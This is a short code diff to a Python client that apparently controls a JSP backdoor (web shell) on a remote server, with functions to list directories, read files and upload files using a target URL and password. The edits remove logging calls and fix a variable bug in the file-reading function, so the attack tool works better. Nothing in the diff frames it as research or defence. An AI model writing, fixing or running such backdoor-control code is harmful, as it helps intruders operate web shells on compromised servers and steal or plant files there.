@@ -1,7 +1,7 @@
 from .sword import Sender
 import os
 import base64
-from DrMoriaty.utils.log import Tprint, gprint, SwordPrint
+
 
 JSP_MAKE=1
 JSP_INDEX="A"
@@ -25,12 +25,9 @@ class Jsp(Sender):
 
     def init(self):
         self.index()
-        dirs = list(self.now_dirs.keys())
-        SwordPrint(self.cmd_result, pwd=self.pwd, dir=dirs, select=dirs[0], sub_dir=[])
+        self.show() 
 
     def index(self):
-        gprint("target:", self.target)
-        gprint("passwd:", self.key)
         res =  self.send(action=JSP_INDEX)
         self.pwd = res
         dirs = self.ls(self.pwd)
@@ -47,7 +44,7 @@ class Jsp(Sender):
 
 
     def readfile(self, file):
-        return self.send(action=JSP_READFILE, z1=path)
+        return self.send(action=JSP_READFILE, z1=file)
 
     def upload(self, file):
         fname = os.path.basename(file)
@@ -78,7 +75,6 @@ class Jsp(Sender):
 
 
 def main(args):
-    gprint("Run jsp backdoor")
     j = Jsp(args.target, args.passwd)
     j.run()
 
